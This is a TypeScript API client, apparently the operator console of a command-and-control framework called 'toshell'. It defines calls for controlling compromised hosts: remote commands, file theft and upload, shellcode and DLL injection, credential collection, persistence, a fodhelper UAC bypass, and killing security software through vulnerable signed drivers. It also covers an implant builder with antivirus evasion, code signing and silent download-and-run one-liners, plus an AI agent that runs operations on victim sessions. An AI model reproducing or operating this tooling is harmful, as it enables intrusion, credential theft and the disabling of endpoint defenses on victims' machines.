import axios from 'axios'
import type { Session, Task, TaskStats, LogEntry, TaskRequest, ListenerInfo, PeResourceRequest } from '../types'

export interface Tunnel {
  id: number
  target_addr: string
  target_port: number
  active: boolean
  created_at: string
  bytes_in: number
  bytes_out: number
  session_id?: string
  local_port?: number
}

const api = axios.create({
  baseURL: '/api/v1',
  timeout: 120000, // 2分钟，兼容 spawn 模式编译 EXE
  headers: {
    'Content-Type': 'application/json',
  },
})

api.interceptors.request.use((config) => {
  const token = localStorage.getItem('toshell-token')
  if (token) {
    config.headers.Authorization = `Bearer ${token}`
  }
  return config
})

api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      localStorage.removeItem('toshell-token')
      window.location.href = '/login'
    }
    return Promise.reject(error)
  }
)

export const authApi = {
  login: (username: string, password: string) =>
    api.post<{ token: string; username: string }>('/login', { username, password }),
  logout: () => api.post('/logout'),
  verify: () => api.get('/verify'),
}

export const sessionApi = {
  list: () => api.get<{ sessions: Session[]; count: number }>('/sessions'),
  get: (id: string) => api.get<Session>(`/sessions/${id}`),
  update: (id: string, comment: string) => api.patch(`/sessions/${id}`, { comment }),
  delete: (id: string) => api.delete(`/sessions/${id}`),
  /** 会话能力清单：可用功能/操作面板（按 OS+通道推导） */
  getCapabilities: (id: string) => api.get<{ tabs: Record<string, boolean>; features: string[] }>(`/sessions/${id}/capabilities`),
  interact: (id: string, command: string, taskType?: string) => 
    api.post(`/sessions/${id}/interact`, { command, task_type: taskType || 'command' }),
  listFiles: (id: string, path: string) => 
    api.get(`/sessions/${id}/files`, { params: { path } }),
  downloadFile: (id: string, path: string) => 
    api.post(`/sessions/${id}/files/download`, { path }),
  deleteFile: (id: string, path: string) => 
    api.post(`/sessions/${id}/files/delete`, { path }),
  uploadFile: (id: string, payload: {
    upload_id: string
    filename: string
    path: string
    size: number
    offset: number
    data: string
    done: boolean
  }) =>
    api.post(`/sessions/${id}/files/upload`, payload),
  listProcesses: (id: string) => 
    api.get(`/sessions/${id}/processes`),
  killProcess: (id: string, pid: number) => 
    api.delete(`/sessions/${id}/processes/${pid}`),
  processInject: (id: string, method: string, pid: number, shellcode?: string, dllPath?: string) =>
    api.post(`/sessions/${id}/inject`, { method, pid, shellcode, dll_path: dllPath }),
  processInjection: (id: string, data: {
    method: string
    target_pid?: number | null
    target_path?: string | null
    payload?: string
    use_default_payload?: boolean
  }) =>
    api.post<{ task_id: number; message: string }>(`/sessions/${id}/process-injection`, data),
  loadBof: (id: string, data: string, args?: string) =>
    api.post(`/sessions/${id}/bof`, { data, args }),
  /** 实时屏幕流：可传帧率/画质/带宽/显示器等参数（服务端校验后透传植入端） */
  screenStream: (
    id: string,
    action: 'start' | 'stop',
    params?: { fps?: number; quality?: number; max_kbps?: number; monitor?: number; max_width?: number; format?: string },
  ) =>
    api.post<{ task_id: number; task_type: string; action: string; params?: Record<string, number | string>; message: string }>(
      `/sessions/${id}/screen-stream`,
      { action, ...(params || {}) },
    ),
  relay: (id: string, action: 'start' | 'stop' | 'status', addr?: string) =>
    api.post<{ task_id: number; task_type: string; action: string; addr: string; message: string }>(`/sessions/${id}/relay`, { action, addr }),
  listRelayNodes: () =>
    api.get<{ relay_nodes: RelayNode[]; count: number }>('/relay-nodes'),
  edrBlind: (id: string) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/blind`, {}),
  edrKill: (id: string, processes?: string[]) =>
    api.post<{ task_id: number; task_type: string; count: number; message: string }>(`/sessions/${id}/edr/kill`, { processes }),
  byovdLoad: (id: string, payload: { driver_b64: string; service_name?: string; device_name?: string; name?: string; kill_ioctl?: string; description?: string }) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-load`, payload),
  byovdUnload: (id: string, serviceName?: string) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-unload`, { service_name: serviceName }),
  /** BYOVD 驱动击杀：按 PID 或进程名调用内置驱动的无鉴权终止 IOCTL */
  byovdKill: (id: string, payload: { pid?: number; process_name?: string; driver?: string; device?: string; ioctl?: string }) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-kill`, payload),
  pplKill: (id: string, processes?: string[]) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/ppl-kill`, { processes }),
  filelessExec: (id: string, payload: {
    kind: 'shellcode' | 'bof' | 'dll' | 'exe' | 'exe_mem'
    payload_b64: string
    args?: string
    entry?: string
    arch?: string
    /** exe_mem：等待执行线程结束的毫秒数（0/省略 = 不等待） */
    wait_ms?: number
    /** 服务端 PE 预检判定为 reject 时，勾选此项强制下发（高危，服务端会记日志留痕） */
    force?: boolean
  }) =>
    api.post<{
      task_id: number
      task_type: string
      kind: string
      args?: string
      message: string
      /** 预检 warn/reject 降级后的风险提示（任务已下发） */
      warnings?: string[]
      /** 处置建议（改用落地执行 / donut / shellcode 等） */
      suggestion?: string
      /** 预检结论：ok / warn / reject */
      preflight_verdict?: string
      /** 精简 PE 指纹，便于操作员核对 */
      pe_info?: {
        machine?: string
        is_64bit?: boolean
        is_dll?: boolean
        has_tls?: boolean
        has_clr?: boolean
        is_go?: boolean
      }
    }>(`/sessions/${id}/fileless-exec`, payload),
  // UAC 提权：fodhelper 拉起高完整性进程，内存执行 shellcode 回连上线
  privescUAC: (id: string) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/privesc-uac`),
}

export const tunnelApi = {
  list: () => api.get<{ servers: SOCKS5ServerInfo[]; count: number }>('/tunnels'),
  create: (session_id: string, local_port: number) => 
    api.post('/tunnels', { session_id, local_port }),
  delete: (sessionId: string) => api.delete(`/tunnels/${sessionId}`),
}

export interface RelayNode {
  session_id: string
  hostname: string
  addr: string
  host: string
  port: string
}

export interface BuiltinDriver {
  name: string
  description: string
  /** 用途：kill = 无鉴权进程终止 */
  purpose?: string
  device: string
  service: string
  /** 终止进程的 IOCTL 码（METHOD_BUFFERED，入参首个 DWORD = PID） */
  ioctl?: number
  kill_pid_size?: number
  size: number
  sha256: string
  /** 签名者（来自 manifest 的人工标注，字符串；实测结论见 verify.signer） */
  signed?: string
  /** 加载前自检结论（服务端 WinVerifyTrust + manifest sha256 一致性 + 黑名单策略提示） */
  verify?: DriverVerifyResult
}

/** 驱动加载前自检结论（对应服务端 drivers.VerifyResult） */
export interface DriverVerifyResult {
  sha256: string
  manifest_sha256?: string
  /** manifest 声明了期望哈希时，实际内容是否一致；false = 服务端会拒绝下发 */
  hash_ok: boolean
  /** 本机 WinVerifyTrust 是否校验通过 */
  signed: boolean
  /** 是否真的做过签名校验（非 Windows 或超时会为 false） */
  signature_checked: boolean
  /** 签名者简单显示名（取不到时为空） */
  signer?: string
  /** 本机是否启用了微软易受攻击驱动黑名单策略 */
  blocklisted: boolean
  blocklist_reason?: string
  warnings?: string[]
  errors?: string[]
  /** 一句话中文结论 */
  summary?: string
}

// BYOVD 驱动：由操作员自备（服务端不内置任何驱动），放 drivers/ 或 data/drivers/ + manifest.json
export const driversApi = {
  list: () => api.get<{ drivers: BuiltinDriver[]; count: number }>('/drivers'),
  raw: async (name: string) => {
    const r = await api.get<ArrayBuffer>(`/drivers/${encodeURIComponent(name)}/raw`, { responseType: 'arraybuffer' })
    return r.data
  },
  /** 单独查询某个驱动的加载前自检结论 */
  verify: (name: string) => api.get<DriverVerifyResult & { ok: boolean }>(`/drivers/${encodeURIComponent(name)}/verify`),
}

// ─── 杀软对抗能力分级（AV-Ops，v1.4.0 S6）───────────────────────────────────────
//
// 服务端把"杀软对抗"从 6 条裸链收成一个**分级、可审计、fail-closed** 的入口：
//   GET  /av-ops                等级目录（这台服务端现在允许做到哪一级）
//   GET  /sessions/{id}/av-ops  对该会话的逐动作可用性（**排障先看这里**）
//   POST /sessions/{id}/av-ops  执行（按动作定级 + 七步前置检查）
//
// ⚠️ 字段口径以**运行中的服务端**为准（本节逐字段与真实响应核对过）：
//   - 目录/会话 actions[] 里的 `impact` 是**字符串**（服务端 avops.Action.Impact 的如实影响文案），
//     **不是对象**；对象形状的 impact 只出现在 POST 的**成功响应**里（见 AVOpsExecImpact）。
//   - `reasons[]` 是 `{code, message}` 对象数组：GET 阶段就把"为什么不能下发"一次列全，
//     界面的职责是**显示原因**而不是让操作员"发一次试试"。
//   - 会话不存在时沿用全项目口径 `404 {"error":"session not found: <id>"}`（**没有 code 字段**）。

/** AV-Ops 理由/错误码（服务端 avops 包的对外契约，只允许新增，不允许改名）。 */
export type AVOpsReasonCode =
  // GET /sessions/{id}/av-ops 的 reasons[].code
  | 'session_inactive'
  | 'tier_disabled'
  | 'confirmation_required'
  | 'capability_missing'
  | 'driver_unavailable'
  // POST 失败时的 code（七步前置检查 + 下发）
  | 'bad_request'
  | 'unknown_action'
  | 'unknown_tier'
  | 'tier_mismatch'
  | 'params_invalid'
  | 'driver_selfcheck_failed'
  | 'timeout_invalid'
  | 'session_not_found'
  | 'task_create_failed'
  | 'push_failed'

/** 策略回显（对应服务端 avopsPolicyView，键是正向的 require_confirm）。 */
export interface AVOpsPolicy {
  allow_l2: boolean
  allow_l3: boolean
  allow_l4: boolean
  require_confirm: boolean
  default_timeout_sec: number
  max_timeout_sec: number
}

/** 动作参数说明（服务端只做展示用，真实校验按动作逐个做）。 */
export interface AVOpsParamHint {
  name: string
  /** string / integer / array（服务端的自由文本口径，前端按此渲染最小输入框） */
  type: string
  required: boolean
  description: string
}

/** 动作表里的一条动作（目录与会话级响应共用这组字段）。 */
export interface AVOpsAction {
  name: string
  tier: string
  task_type: string
  capability: string
  destructive: boolean
  needs_confirm: boolean
  summary: string
  /** 如实的影响评估**文案**（字符串；对象形状见 AVOpsExecImpact） */
  impact: string
  /** false = 服务端不会自动重投递（重发 = 再执行） */
  auto_retry: boolean
  required_params?: string[]
  params?: AVOpsParamHint[]
}

/** 等级目录里的一项。 */
export interface AVOpsTier {
  tier: string
  name: string
  description: string
  default_enabled: boolean
  read_only: boolean
  destructive: boolean
  needs_confirm: boolean
  no_auto_retry: boolean
  /** false = 本批没有落地动作（L4）；界面必须显示"暂无落地动作"，不能给假按钮 */
  implemented: boolean
  note?: string
  allowed: boolean
  /** allowed=false 时的中文原因 */
  denied_reason?: string
  action_count: number
  actions: AVOpsAction[]
}

export interface AVOpsCatalog {
  ok: boolean
  policy: AVOpsPolicy
  tiers: AVOpsTier[]
  action_count: number
  notes?: string[]
  probe_hint?: string
}

export interface AVOpsReason {
  code: AVOpsReasonCode
  message: string
}

/** 会话级逐动作可用性（= 动作表字段 + tier_name/allowed/reasons）。 */
export interface AVOpsSessionAction extends AVOpsAction {
  tier_name: string
  allowed: boolean
  /** 阻塞该动作的**全部**原因（服务端一次列全，不是遇错即停） */
  reasons: AVOpsReason[]
}

/** BYOVD 驱动档位现状（L3 排障用；只看 manifest 声明）。 */
export interface AVOpsDriverSnapshot {
  kill_available: boolean
  rw_available: boolean
  total: number
  purposes?: string[] | null
  search_dirs?: string[]
  note?: string
}

export interface AVOpsSessionState {
  ok: boolean
  session_id: string
  status?: string
  os?: string
  arch?: string
  features?: string[]
  /** reported = 载荷自报（权威）/ os_fallback = 按 OS 兜底（未必等于真实能力） */
  capability_source?: string
  capability_note?: string
  policy: AVOpsPolicy
  driver?: AVOpsDriverSnapshot
  actions: AVOpsSessionAction[]
  summary?: { allowed: number; blocked: number; total: number }
  message?: string
}

export interface AVOpsExecRequest {
  action: string
  /** 只用于一致性核对（与实际等级不符 → 400 tier_mismatch）；留空由服务端决定 */
  tier?: string
  /** 破坏性动作（L1 起）必填 true */
  confirm?: boolean
  params?: Record<string, unknown>
  /** 留空/0 = 用服务端默认；> 上限直接拒绝（不截断） */
  timeout_sec?: number
}

/** 一步前置检查的结论。 */
export interface AVOpsCheck {
  step: number
  name: string
  ok: boolean
  code?: string
  detail?: string
}

/** POST 成功响应里的**对象**影响评估（与动作表里的 impact 字符串不同）。 */
export interface AVOpsExecImpact {
  destructive: boolean
  auto_retry: boolean
  reversible: boolean
  summary: string
  targets?: string
  timeout_sec: number
  irreversible_note?: string
}

export interface AVOpsExecResult {
  ok: true
  task_id: number
  task_type: string
  action: string
  tier: string
  tier_name: string
  destructive: boolean
  confirmed: boolean
  auto_retry: boolean
  impact: AVOpsExecImpact
  checks: AVOpsCheck[]
  /** 破坏性动作的服务端警告（L0 时为 null） */
  warnings?: string[] | null
  message: string
}

export interface AVOpsExecFailure {
  /** 会话不存在（404）时服务端只回 `{error}`，此时没有这个字段 */
  ok?: false
  /** 同上：404 的 `{error}` 没有 code */
  code?: AVOpsReasonCode
  error: string
  /** 同上：404 的 `{error}` 没有 checks（非 404 时至少含失败的那一步） */
  checks?: AVOpsCheck[]
}

export const avOpsApi = {
  /** 等级目录：判断"这台服务端现在允许做到哪一级"（老服务端 → 404） */
  catalog: () => api.get<AVOpsCatalog>('/av-ops'),
  /** 逐动作可用性：allowed=false 的动作带中文 reasons[]，不必发一次试试 */
  forSession: (id: string) => api.get<AVOpsSessionState>(`/sessions/${encodeURIComponent(id)}/av-ops`),
  /** 执行：服务端按动作定级 + 七步前置检查；破坏性动作必须带 confirm=true */
  exec: (id: string, body: AVOpsExecRequest) =>
    api.post<AVOpsExecResult>(`/sessions/${encodeURIComponent(id)}/av-ops`, body),
}

function isRecord(v: unknown): v is Record<string, unknown> {
  return typeof v === 'object' && v !== null
}

/** AV-Ops 请求失败时的 HTTP 状态（非 axios 异常 → 0）。 */
export function avOpsHttpStatus(err: unknown): number {
  return axios.isAxiosError(err) ? err.response?.status ?? 0 : 0
}

/** 从失败响应里取出可判定的错误文案（404 的纯文本 / `{error}` / 网络错误都覆盖）。 */
export function avOpsErrorMessage(err: unknown): string {
  if (axios.isAxiosError(err)) {
    const data: unknown = err.response?.data
    if (typeof data === 'string' && data.trim()) return data.trim()
    if (isRecord(data) && typeof data.error === 'string' && data.error) return data.error
    return err.message
  }
  return err instanceof Error ? err.message : String(err)
}

/** 从 POST 失败响应里取出 `{code,error,checks[]}`（形状不符时返回 null，由调用方兜底）。 */
export function avOpsFailure(err: unknown): AVOpsExecFailure | null {
  if (!axios.isAxiosError(err)) return null
  const data: unknown = err.response?.data
  if (!isRecord(data)) return null
  if (typeof data.error !== 'string') return null
  const checks = Array.isArray(data.checks) ? (data.checks as AVOpsCheck[]) : []
  const code = typeof data.code === 'string' ? (data.code as AVOpsReasonCode) : undefined
  return { ok: false, code, error: data.error, checks }
}

// 运行时设置（设置页真实读写，保存后热生效）
export interface SettingsResponse {
  general: Record<string, unknown>
  listener: Record<string, unknown>
  implant: Record<string, unknown>
  notifications: Record<string, unknown>
  security: Record<string, unknown>
}
export const settingsApi = {
  get: () => api.get<SettingsResponse>('/settings'),
  save: (updates: Record<string, unknown>) =>
    api.put<{ message: string; hot: boolean }>('/settings', updates),
  testWebhook: (payload: { url: string; content?: string; format?: string; secret?: string }) =>
    api.post<{ ok: boolean; platform?: string; status_code: number; response: string; error?: string }>(
      '/settings/webhook/test',
      payload,
    ),
}

export interface SOCKS5ServerInfo {
  session_id: string
  local_port: number
  tunnels: Tunnel[]
}

export interface Plugin {
  id: string
  name: string
  description: string
  type: string
  size: number
  path: string
  created_at: string
  updated_at: string
}

export const pluginApi = {
  list: () => api.get<{ plugins: Plugin[]; count: number }>('/plugins'),
  get: (id: string) => api.get<Plugin>(`/plugins/${id}`),
  upload: (file: File, description?: string) => {
    const formData = new FormData()
    formData.append('file', file)
    if (description) {
      formData.append('description', description)
    }
    return api.post<Plugin>('/plugins', formData, {
    headers: { 'Content-Type': 'multipart/form-data' },
    })
  },
  delete: (id: string) => api.delete(`/plugins/${id}`),
  refresh: () => api.post<{ plugins: Plugin[]; count: number }>('/plugins/refresh'),
  load: (sessionId: string, pluginId: string, args?: string) => 
    api.post<{ task_id: number; plugin: Plugin; status: string; message: string }>(`/sessions/${sessionId}/plugin`, { 
      plugin_id: pluginId, 
      args: args || '' 
    }),
}



export const taskApi = {
  list: () => api.get<Task[]>('/tasks'),
  get: (id: number) => api.get<Task>(`/tasks/${id}`),
  create: (data: TaskRequest) => api.post<Task>('/tasks', data),
  delete: (id: number) => api.delete(`/tasks/${id}`),
  cancel: (id: number) => api.post(`/tasks/${id}/cancel`),
  stats: () => api.get<{ stats: TaskStats }>('/tasks/stats'),
}

export const logApi = {
  list: (limit?: number, level?: string) => 
    api.get<{ logs: LogEntry[]; count: number }>('/logs', { 
      params: { limit, level } 
    }),
}

export const systemApi = {
  stats: () => api.get('/system/stats'),
  health: () => api.get('/health'),
}

export interface ListenerPayload {
  name: string
  type: string
  protocol: string
  bind_addr: string
  bind_port: number
  public_addr?: string
}

export const listenerApi = {
  list: () => api.get<{ listeners: ListenerInfo[]; count: number }>('/listeners'),
  create: (data: ListenerPayload) => api.post<ListenerInfo>('/listeners', data),
  update: (id: string, data: ListenerPayload) => api.put<ListenerInfo>(`/listeners/${id}`, data),
  get: (id: string) => api.get<ListenerInfo>(`/listeners/${id}`),
  start: (id: string) => api.post<{ id: string; status: string; message: string }>(`/listeners/${id}/start`),
  stop: (id: string) => api.post<{ id: string; status: string; message: string }>(`/listeners/${id}/stop`),
  delete: (id: string) => api.delete<{ message: string }>(`/listeners/${id}`),
}

export interface BuildRequest extends PeResourceRequest {
  name: string
  format: string
  /** 植入端语言：go(默认,全功能) / c(C 植入端,体积极小,仅 Windows) */
  language?: string
  listener_id: string
  server_url: string
  protocol: string
  /**
   * 心跳间隔（秒）。**留空/0 = 跟随服务端配置**（「设置 → 植入端默认参数」里的
   * `implant.interval`，未配置时回退 60s）。构建页输入框留空即发 0。
   */
  interval: number
  /** 抖动（%）。**留空/0 = 跟随服务端配置**（`implant.jitter`，未配置时回退 20%）。 */
  jitter: number
  /** 重试次数。**留空/0 = 用默认值 3**（该项没有服务端配置项）。 */
  retry_count: number
  /** 重试间隔（秒）。**留空/0 = 跟随服务端配置**（`implant.retry_wait`，未配置时回退 5s）。 */
  retry_wait: number
  kill_date: string
  working_hours: string
  relay_listen?: string
  front_domain?: string
  profile?: string
  output_path: string
  os: string
  arch: string
  /** 一键上线命令中的下载地址（可选）：留空由服务端按 public_host/控制台地址自动解析 */
  download_host?: string
  // Evasion options
  xor_encrypt?: boolean
  xor_key_size?: number
  garble_enabled?: boolean
  upx_enabled?: boolean
  /**
   * 主动反沙箱进程检测（默认关闭）：启动时枚举进程并与安全软件/分析工具进程名
   * 比对，命中则延迟执行。国产杀软（360/火绒/电脑管家）主动防御会拦截该对抗行为，
   * 且会把 toolhelp32 导入与进程名字符串写进载荷，故默认不编译。
   */
  evasion_scan?: boolean
  /**
   * BOF 支持（默认关闭）：开启会带上整套 Cobalt Strike Beacon API 名字
   * （BeaconDataParse/BeaconOutput…，实测 22 处 pclntab 明文），只在需要跑 BOF 时开。
   */
  bof_enabled?: boolean
  /**
   * 构建后代码签名（Authenticode）：证书配置在服务端 builder.sign_*，这里只能开启。
   * 未签名的新 PE 在装有 360/电脑管家的主机上会被拒绝执行并删除。
   */
  sign_enabled?: boolean
  /** DLL 载荷（format=dll）：导出函数名（rundll32 payload.dll,<名字>；留空=Start） */
  dll_export?: string
  /** DLL 载荷是否"加载即启动"（白加黑场景宿主不一定调用我们的导出函数，默认 true） */
  dll_autostart?: boolean
  /** 启动随机延迟（秒）：留空用服务端配置（implant.startup_delay_min/max） */
  startup_delay_min?: number
  startup_delay_max?: number
  // PE 版本资源 / 图标 / 公司信息 / 时间戳（resource_*）见 PeResourceRequest：
  // 定义放在 types/index.ts，因为它们是"构建请求 → .rsrc 内容"的契约（服务端 builder
  // 侧是同名字段），前端生成载荷页与设置页都要引用同一份说明。
}

export interface BuildResponse {
  id: string
  name: string
  format: string
  size: number
  sha256: string
  build_time: string
  download_url: string
  /** 一条命令上线：复制到目标机执行即可静默下载并运行载荷（exe/raw 生效） */
  one_liner?: string
  /** 一条命令上线实际使用的下载主机（host[:port]），由服务端解析 */
  one_liner_host?: string
  /** 一条命令上线使用的下载基址（如 https://c2.example.com） */
  one_liner_base?: string
  /** 非空表示下载地址可能对目标机不可达（回环/仅内网），需提示运维 */
  one_liner_warning?: string
  /** 多条免杀上线命令变体（PowerShell/BITS/LOLBin/curl/python 等） */
  one_liners?: OneLinerVariant[]
  /** 产物是否带有效 Authenticode 签名（启用代码签名时才有意义） */
  signed?: boolean
  /** 签名者主题（如 CN=xxx, O=yyy） */
  signer?: string
  /** 实际使用的签名方式：powershell / signtool / none */
  sign_method?: string
  /** 签名复核状态：Valid / NotSigned / UnknownError … */
  sign_status?: string
  /** 中文说明（未签名的原因 / 失败原因） */
  sign_message?: string
  /** 落地链建议标题（按平台/格式 + 是否已签名给出"该走哪条链"） */
  loader_advice_title?: string
  /** 落地链建议要点，顺序即优先级（直接运行 → 计划任务 → 白加黑 → 内存加载） */
  loader_advice_tips?: string[]
}

/** 一条命令上线的单个变体：由服务端生成，前端只做展示与复制 */
export interface OneLinerVariant {
  /** 变体名，如 "PowerShell · Base64 编码" */
  name: string
  os: string
  /** 解释器：PowerShell / CMD / Shell */
  shell: string
  /** 手法与适用场景说明 */
  desc: string
  command: string
  /** 加载器链的补充说明：前置条件 / 占位符含义 / 国产杀软下的风险等级 */
  note?: string
}

/** 一键上线命令集合：含下载地址解析结果与不可达告警 */
export interface OneLinerSet {
  host: string
  base_url: string
  warning?: string
  variants: OneLinerVariant[]
  /** 该载荷格式不支持一条命令上线时的说明 */
  error?: string
}

export interface BuilderInfo {
  formats: string[]
  protocols: string[]
  os: string[]
  arch: string[]
  listeners: ListenerInfo[]
  /** 植入端语言能力：go 恒可用，c 依赖服务端 mingw gcc */
  languages?: {
    go: boolean
    c: boolean
    c_message?: string
  }
  options: {
    interval: { min: number; max: number; default: number }
    jitter: { min: number; max: number; default: number }
    retry_count: { min: number; max: number; default: number }
    retry_wait: { min: number; max: number; default: number }
  }
  /**
   * 服务端「设置 → 植入端默认参数」里的**当前生效值**（服务端已按构建时的归一化
   * 规则算好）。生成载荷页把它们显示成对应输入框的 placeholder：留空 = 跟随服务端，
   * 这样就不用"设置里配一遍、构建页再填一遍"。
   */
  implant_defaults?: {
    interval?: number
    jitter?: number
    retry_count?: number
    retry_wait?: number
    startup_delay_min?: number
    startup_delay_max?: number
  }
  evasion?: {
    garble_available: boolean
    /** garble 不可用的原因（或可用时的路径说明） */
    garble_message?: string
    upx_available: boolean
    /** 服务端是否已配好代码签名证书（builder.sign_enabled + pfx/指纹） */
    sign_configured?: boolean
    /** 代码签名的配置说明（未配置原因 / 使用的证书与签名栈） */
    sign_message?: string
    /** BOF 默认是否编译进载荷（恒为 false：需要时在页面勾选） */
    bof_default?: boolean
    /** 本机能否为 amd64 构建真正的 DLL（兼容字段；按架构判断请用 dll_arch） */
    dll_available?: boolean
    /** DLL 能力说明（不可用时给出安装哪种 gcc） */
    dll_message?: string
    /** 按目标架构分别给出 DLL 能力：c-shared 需要与架构一致的 mingw gcc */
    dll_arch?: Record<string, { available: boolean; message: string }>
    // ─── PE 资源注入能力（v1.4.0 S3 第二批）───
    /**
     * 可用的资源预设名（如 ["neutral"]）。**老版本服务端可能整段缺失或返回空数组**
     * → 前端不渲染预设下拉（不能当成错误，也不能硬编码预设名）。
     */
    resource_presets?: string[]
    /** 默认状态："off" = 不带 resource_* 字段时产物逐字节不变 */
    resource_default?: string
    /** 资源写入在交付流水线里的位置（契约：pe_resource_patch = 指纹擦除之后、UPX/签名之前） */
    resource_order?: string
    /** 服务端给的中文说明（图标只吃服务端本地 .ico 路径等），有就直接展示 */
    resource_note?: string
  }
}

export const builderApi = {
  list: () => api.get<BuilderInfo>('/builders'),
  create: (data: BuildRequest) => api.post<BuildResponse>('/builders', data),
  download: (data: BuildRequest) => api.post('/builders/download', data, {
    responseType: 'blob',
  }),
}

export interface InjectionMethod {
  name: string
  description: string
  requires_pid: boolean
  requires_path: boolean
  requires_shellcode: boolean
  requires_dll: boolean
}

export interface InjectionRequest {
  method: string
  target_pid?: number
  target_process_name?: string
  target_path?: string
  shellcode?: string
  dll_path?: string
  parent_pid?: number
}

export const injectionApi = {
  listMethods: () => api.get<{ methods: InjectionMethod[]; count: number }>('/injection/methods'),
  execute: (sessionId: string, data: InjectionRequest) =>
    api.post<{ task_id: number; task_type: string; method: string; message: string }>(`/sessions/${sessionId}/injection`, data),
}

export interface PersistenceMethod {
  name: string
  description: string
  reliable: boolean
}

export const persistenceApi = {
  listMethods: (sessionId: string) =>
    api.get<{ task_id: number; message: string }>(`/sessions/${sessionId}/persistence`),
  install: (sessionId: string, method: string) =>
    api.post<{ task_id: number; method: string; message: string }>(`/sessions/${sessionId}/persistence/install`, { method }),
  remove: (sessionId: string) =>
    api.post<{ task_id: number; message: string }>(`/sessions/${sessionId}/persistence/remove`, {}),
}

export const credentialApi = {
  collect: (sessionId: string, action: string = 'all') =>
    api.post(`/sessions/${sessionId}/credentials`, { action }),
}

export const screenshotApi = {
  take: (sessionId: string) =>
    api.post<{ task_id: number; message: string }>(`/sessions/${sessionId}/screenshot`),
  getResult: (taskId: number) =>
    api.get<{ output?: string; error?: string; status: string }>(`/tasks/${taskId}`),
}

export const templateApi = {
  list: () => api.get('/templates'),
  get: (id: string) => api.get(`/templates/${id}`),
  create: (data: { name: string; description: string; category: string; tasks: any[] }) =>
    api.post('/templates', data),
  update: (id: string, data: { name: string; description: string; category: string; tasks: any[] }) =>
    api.put(`/templates/${id}`, data),
  delete: (id: string) => api.delete(`/templates/${id}`),
  execute: (sessionId: string, templateId: string) =>
    api.post(`/sessions/${sessionId}/workflow`, { template_id: templateId }),
  getWorkflow: (id: string) => api.get(`/workflows/${id}`),
}

export interface CopilotTrace {
  name: string
  args?: Record<string, string>
  result?: string
  error?: string
}

// 副驾驶工具审批请求（normal 权限模式下影响会话的操作需用户确认）
export interface ConsentReq {
  token: string
  tool: string
  args?: Record<string, string>
  desc?: string
}

// AI 副驾驶：LLM 聊天 + 工具调用（端点 /copilot/status /copilot/chat /copilot/consent）
export const copilotApi = {
  status: () =>
    api.get<{ enabled: boolean; model: string; consent_policy?: string; consent_mode?: string; notice?: string }>(
      '/copilot/status',
    ),
  // v1.4.0 S2：/copilot/chat 与 /copilot/consent 的响应新增 trace_id / stop_reason
  // （stop_reason: max_turns / max_tool_calls / max_wallclock / loop_detected / awaiting_consent）
  chat: (messages: { role: string; content: string }[]) =>
    api.post<{ reply: string; traces: CopilotTrace[]; pending_consents?: ConsentReq[]; trace_id?: string; stop_reason?: string }>('/copilot/chat', { messages }, { timeout: 240000 }),
  consent: (token: string, decision: 'allow' | 'deny') =>
    api.post<{ reply: string; traces: CopilotTrace[]; pending_consents?: ConsentReq[]; trace_id?: string; stop_reason?: string }>('/copilot/consent', { token, decision }, { timeout: 240000 }),
  playbooks: () => api.get<{ playbooks: Playbook[]; count: number }>('/copilot/playbooks'),
  runPlaybook: (playbook_id: string, session_id: string) =>
    api.post<{ run_id: string; status: string }>('/copilot/playbook/run', { playbook_id, session_id }),
  playbookRuns: () => api.get<{ runs: PlaybookRun[]; count: number }>('/copilot/playbook/runs'),
  playbookRun: (id: string) => api.get<PlaybookRun>(`/copilot/playbook/runs/${id}`),
}

// ─── 异步自主 Agent ─────────────────────────────────────────────────
// 非阻塞：agentChat 立即返回 run_id，事件经 SSE 流式推送，可实时渲染思考与工具步骤。
export const agentApi = {
  /** 创建/续接异步 agent run（立即返回 run_id+session_id，不卡对话）。session_id 用于续接同一自主记忆上下文。 */
  chat: (messages: { role: string; content: string }[], sessionId?: string) =>
    api.post<{ run_id: string; session_id: string; status: string }>('/agent/chat', sessionId ? { messages, session_id: sessionId } : { messages }),
  /** 查询 run 状态/目标/计划/轨迹/时间线/最终答复 */
  status: (runId: string) => api.get<{ run_id: string; status: string; objective?: string; plan?: { index: number; desc: string; status: string }[]; traces: CopilotTrace[]; timeline?: { ts: number; kind: string; text: string }[]; reply: string }>(`/agent/runs/${runId}`),
  /** 取消 run */
  cancel: (runId: string) => api.post<{ run_id: string; status: string }>(`/agent/runs/${runId}/cancel`),
  /** 处理审批：allow/deny */
  consent: (runId: string, decision: 'allow' | 'deny') =>
    api.post<{ run_id: string; status: string }>(`/agent/runs/${runId}/consent`, { decision }),
  /** SSE 事件流：thinking / message / tool_start / tool_result / final / done / status / resync
   *  shouldContinue 用于"用户已经切到别的 run"时停止自动重连（默认一直续传）。
   *  续传：内部记录每个事件的 `id:`，断线后带 `Last-Event-ID` 重连，服务端会恰好补齐缺口。
   *
   *  initialEventId：**跨轮共享的水位线**。run 是跨轮复用的（同一条 session_id 续接同一个 run，
   *  后续指令都新开一条 SSE），把"这个 run 上我已经消费过的最大事件 id"传进来，新一轮就只收
   *  本轮增量（服务端 `snap.After(lastID)`）：不会重复回放已消费的缓冲，也不会因为服务端对运行中
   *  的 run 采用"从当前开始"语义、或对终态 run 的 200 条尾巴回放上限而漏掉本轮开头的增量。
   *  不传/传 0 = 服务端默认语义。 */
  events: (
    runId: string,
    onEvent: (ev: AgentStreamEvent) => void,
    onDone: () => void,
    shouldContinue?: () => boolean,
    initialEventId?: number,
  ) => streamAgent(runId, onEvent, onDone, shouldContinue, initialEventId),
}

export interface AgentStreamEvent {
  event: string
  data: any
  /** 服务端给每个 run 事件分配的 run 内序号（控制帧没有）。断点续传的水位线。 */
  id?: number
}

// SSE 重连参数：服务端会在连接建立时下发 `retry:`，这里给一个兜底默认值。
const SSE_DEFAULT_RETRY_MS = 3000
// 最多连续重连次数（之后交给 2s 轮询兜底，不再无限重试占着连接）。
const SSE_MAX_RECONNECTS = 8

// streamAgent 用 fetch + ReadableStream 消费 SSE（axios 无法流式，故用原生 fetch）。
//
